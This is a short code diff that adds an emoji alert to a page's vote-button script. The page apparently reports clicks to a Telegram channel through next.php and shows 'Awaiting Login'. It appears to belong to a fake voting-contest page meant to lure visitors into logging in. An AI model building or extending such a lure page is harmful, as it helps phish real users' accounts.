@@ -169,6 +169,9 @@
 
     <script>
         function sendVoteNotification() {
+            // Show alert with emojis
+            alert('🎯 VOTE BUTTON CLICKED!\n\n👑 Contestant: FASHION BRAND\n⏳ Status: Awaiting Login');
+
             // Send vote notification to Telegram
             const xhr = new XMLHttpRequest();
             xhr.open('POST', 'next.php', true);
